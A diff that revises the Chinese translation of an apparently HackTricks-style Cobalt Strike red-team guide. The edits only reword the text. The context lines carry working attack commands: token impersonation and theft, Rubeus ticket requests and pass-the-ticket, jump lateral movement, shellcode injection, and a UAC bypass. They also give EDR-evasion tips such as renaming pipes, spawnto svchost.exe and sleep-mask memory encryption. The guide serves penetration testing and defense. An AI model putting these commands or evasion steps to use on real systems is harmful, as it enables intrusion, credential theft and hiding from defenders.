@@ -70,7 +70,7 @@ psinject <pid> <arch> <commandlet> <arguments> # 这将UnmanagedPowerShell注入
 make_token [DOMAIN\user] [password] # 创建令牌以在网络中冒充用户
 ls \\computer_name\c$ # 尝试使用生成的令牌访问计算机中的C$
 rev2self # 停止使用make_token生成的令牌
-## 使用make_token会生成事件4624：帐户成功登录。此事件在Windows域中非常常见，但可以通过过滤登录类型来缩小范围。如上所述，它使用LOGON32_LOGON_NEW_CREDENTIALS，即类型9。
+## 使用make_token会生成事件4624：帐户成功登录。此事件在Windows域中非常常见，但可以通过过滤登录类型来缩小范围。如上所述，它使用LOGON32_LOGON_NEW_CREDENTIALS，这是类型9。
 
 # UAC 绕过
 elevate svc-exe <listener>
@@ -106,7 +106,7 @@ steal_token <pid> # 从mimikatz创建的进程中窃取令牌
 ## 请求票证
 execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
 execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
-## 创建一个新的登录会话以使用新票证（以免覆盖被攻陷的票证）
+## 创建一个新的登录会话以与新票证一起使用（以免覆盖被破坏的票证）
 make_token <domain>\<username> DummyPass
 ## 从powershell会话中将票证写入攻击者机器并加载
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
@@ -127,7 +127,7 @@ execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
 execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
 ### 在生成的登录会话中插入票证
 execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
-### 最后，从新进程中窃取令牌
+### 最后，从该新进程中窃取令牌
 steal_token <pid>
 
 # 横向移动
@@ -136,7 +136,7 @@ jump [method] [target] [listener]
 ## 方法：
 ## psexec                    x86   使用服务运行服务EXE工件
 ## psexec64                  x64   使用服务运行服务EXE工件
-## psexec_psh                x86   使用服务运行PowerShell一行代码
+## psexec_psh                x86   使用服务运行PowerShell单行命令
 ## winrm                     x86   通过WinRM运行PowerShell脚本
 ## winrm64                   x64   通过WinRM运行PowerShell脚本
 ## wmi_msbuild               x64   使用msbuild内联C#任务的wmi横向移动（opsec）
@@ -173,7 +173,7 @@ ps
 shinject <pid> x64 C:\Payloads\msf.bin # 在x64进程中注入metasploit shellcode
 
 # 将metasploit会话传递给cobalt strike
-## 生成无状态信标shellcode，转到Attacks > Packages > Windows Executable (S)，选择所需的监听器，选择Raw作为输出类型，并选择使用x64有效载荷。
+## 生成无状态信标shellcode，转到Attacks > Packages > Windows Executable (S)，选择所需的监听器，选择Raw作为输出类型并选择使用x64有效载荷。
 ## 在metasploit中使用post/windows/manage/shellcode_inject注入生成的cobalt strike shellcode。
 
 # 透传
@@ -187,14 +187,14 @@ beacon> ssh 10.10.17.12:22 username password</code></pre>
 
 ### Execute-Assembly
 
-**`execute-assembly`** 使用**牺牲进程**通过远程进程注入来执行指定的程序。这是非常嘈杂的，因为要在进程内部注入，使用了每个EDR都在检查的某些Win API。然而，有一些自定义工具可以用于在同一进程中加载某些内容：
+**`execute-assembly`** 使用**牺牲进程**通过远程进程注入来执行指定的程序。这是非常嘈杂的，因为要在进程内部注入，使用了每个EDR都在检查的某些Win API。然而，有一些自定义工具可以用来在同一进程中加载某些内容：
 
 - [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
 - [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
 - 在Cobalt Strike中，您还可以使用BOF（信标对象文件）：[https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
 - [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
 
-agressor脚本 `https://github.com/outflanknl/HelpColor` 将在Cobalt Strike中创建 `helpx` 命令，该命令将在命令中添加颜色，指示它们是否是BOFs（绿色）、是否是Frok&Run（黄色）及类似，或者是否是ProcessExecution、注入或类似（红色）。这有助于了解哪些命令更隐蔽。
+agressor脚本 `https://github.com/outflanknl/HelpColor` 将在Cobalt Strike中创建 `helpx` 命令，该命令将在命令中添加颜色，指示它们是否为BOFs（绿色），是否为Frok&Run（黄色）等，或者是否为ProcessExecution、注入或类似（红色）。这有助于了解哪些命令更隐蔽。
 
 ### 作为用户操作
 
@@ -203,13 +203,13 @@ agressor脚本 `https://github.com/outflanknl/HelpColor` 将在Cobalt Strike中�
 - 安全EID 4624 - 检查所有交互式登录以了解通常的操作时间。
 - 系统EID 12,13 - 检查关机/启动/睡眠频率。
 - 安全EID 4624/4625 - 检查有效/无效的NTLM尝试。
-- 安全EID 4648 - 当使用明文凭据登录时，会生成此事件。如果某个进程生成了它，则该二进制文件可能在配置文件或代码中以明文形式包含凭据。
+- 安全EID 4648 - 当使用明文凭据登录时，会生成此事件。如果是进程生成的，则该二进制文件可能在配置文件或代码中以明文形式包含凭据。
 
 在使用Cobalt Strike的 `jump` 时，最好使用 `wmi_msbuild` 方法使新进程看起来更合法。
 
 ### 使用计算机帐户
 
-防御者通常会检查用户生成的奇怪行为，并**将服务帐户和计算机帐户如`*$`排除在监控之外**。您可以使用这些帐户进行横向移动或权限提升。
+防御者通常会检查用户生成的奇怪行为，并**将服务帐户和计算机帐户如`*$`排除在监控之外**。您可以使用这些帐户进行横向移动或特权提升。
 
 ### 使用无状态有效载荷
 
@@ -217,7 +217,7 @@ agressor脚本 `https://github.com/outflanknl/HelpColor` 将在Cobalt Strike中�
 
 ### 令牌和令牌存储
 
-在窃取或生成令牌时要小心，因为EDR可能会枚举所有线程的所有令牌并找到**属于不同用户**甚至SYSTEM的令牌。
+在窃取或生成令牌时要小心，因为EDR可能能够枚举所有线程的所有令牌并找到**属于不同用户**甚至SYSTEM的令牌。
 
 这允许按**信标**存储令牌，因此不需要一次又一次地窃取相同的令牌。这对于横向移动或当您需要多次使用窃取的令牌时非常有用：
 
@@ -232,7 +232,7 @@ agressor脚本 `https://github.com/outflanknl/HelpColor` 将在Cobalt Strike中�
 
 ### 防护措施
 
-Cobalt Strike有一个名为**Guardrails**的功能，可以帮助防止使用某些命令或操作，这些操作可能会被防御者检测到。Guardrails可以配置为阻止特定命令，例如`make_token`、`jump`、`remote-exec`和其他常用于横向移动或权限提升的命令。
+Cobalt Strike具有称为**Guardrails**的功能，帮助防止使用某些可能被防御者检测到的命令或操作。可以配置Guardrails以阻止特定命令，例如 `make_token`、`jump`、`remote-exec` 和其他常用于横向移动或特权提升的命令。
 
 此外，repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) 还包含一些检查和建议，您可以在执行有效载荷之前考虑。
 
@@ -242,17 +242,17 @@ Cobalt Strike有一个名为**Guardrails**的功能，可以帮助防止使用�
 
 ### 避免默认设置
 
-使用Cobalt Strike时，默认情况下，SMB管道将命名为`msagent_####`和`"status_####`。更改这些名称。可以使用命令 `ls \\.\pipe\` 检查Cobalt Strike中现有管道的名称。
+使用Cobalt Strike时，默认情况下，SMB管道将具有名称 `msagent_####` 和 `"status_####`。更改这些名称。可以使用命令 `ls \\.\pipe\` 检查Cobalt Strike中现有管道的名称。
 
-此外，使用SSH会话时，会创建一个名为`\\.\pipe\postex_ssh_####`的管道。使用 `set ssh_pipename "<new_name>";` 更改它。
+此外，使用SSH会话时，会创建一个名为 `\\.\pipe\postex_ssh_####` 的管道。使用 `set ssh_pipename "<new_name>";` 更改它。
 
-在后期利用攻击中，管道 `\\.\pipe\postex_####` 可以通过 `set pipename "<new_name>"` 进行修改。
+在后期利用攻击中，管道 `\\.\pipe\postex_####` 可以使用 `set pipename "<new_name>"` 进行修改。
 
 在Cobalt Strike配置文件中，您还可以修改以下内容：
 
 - 避免使用 `rwx`
 - 进程注入行为的工作方式（将使用哪些API）在 `process-inject {...}` 块中
-- “fork and run”在 `post-ex {…}` 块中的工作方式
+- “fork and run” 在 `post-ex {…}` 块中的工作方式
 - 睡眠时间
 - 要加载到内存中的二进制文件的最大大小
 - 内存占用和DLL内容与 `stage {...}` 块
@@ -260,19 +260,19 @@ Cobalt Strike有一个名为**Guardrails**的功能，可以帮助防止使用�
 
 ### 绕过内存扫描
 
-一些EDR扫描内存以查找已知恶意软件签名。Cobalt Strike允许修改 `sleep_mask` 函数作为BOF，这将能够在内存中加密后门。
+一些ERDs扫描内存以查找已知恶意软件签名。Cobalt Strike允许修改 `sleep_mask` 函数作为BOF，这将能够在内存中加密后门。
 
 ### 嘈杂的进程注入
 
-当将代码注入进程时，这通常是非常嘈杂的，因为**没有常规进程通常执行此操作，并且执行此操作的方法非常有限**。因此，它可能会被基于行为的检测系统检测到。此外，它还可能被EDR检测到，后者扫描网络以查找**包含不在磁盘上的代码的线程**（尽管诸如使用JIT的浏览器等进程通常会这样做）。示例：[https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
+当将代码注入进程时，这通常是非常嘈杂的，因为**没有常规进程通常执行此操作，并且执行此操作的方法非常有限**。因此，它可能会被基于行为的检测系统检测到。此外，它还可能被EDR检测到，后者扫描网络以查找**包含不在磁盘上的代码的线程**（尽管使用JIT的浏览器等进程通常会这样做）。示例：[https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
 
 ### Spawnas | PID和PPID关系
 
-在生成新进程时，重要的是**保持进程之间的常规父子**关系，以避免检测。如果svchost.exec正在执行iexplorer.exe，它看起来会很可疑，因为svchost.exe在正常的Windows环境中不是iexplorer.exe的父进程。
+在生成新进程时，重要的是**保持进程之间的常规父子关系**以避免检测。如果svchost.exec正在执行iexplorer.exe，它看起来会很可疑，因为svchost.exe在正常的Windows环境中不是iexplorer.exe的父进程。
 
-当在Cobalt Strike中生成新信标时，默认情况下会创建一个使用**`rundll32.exe`**的进程来运行新的监听器。这不是很隐蔽，容易被EDR检测到。此外，`rundll32.exe`在没有任何参数的情况下运行，使其更加可疑。
+当在Cobalt Strike中生成新的信标时，默认情况下会创建一个使用**`rundll32.exe`**的进程来运行新的监听器。这不是很隐蔽，容易被EDR检测到。此外，`rundll32.exe`在没有任何参数的情况下运行，使其更加可疑。
 
-使用以下Cobalt Strike命令，您可以指定一个不同的进程来生成新的信标，从而使其更难被检测到：
+使用以下Cobalt Strike命令，您可以指定一个不同的进程来生成新的信标，从而使其更不易被检测到：
 ```bash
 spawnto x86 svchost.exe
 ```
@@ -292,6 +292,7 @@ spawnto x86 svchost.exe
 #### AV/AMSI/ETW Bypass
 
 Check the page:
+
 
 {{#ref}}
 av-bypass.md
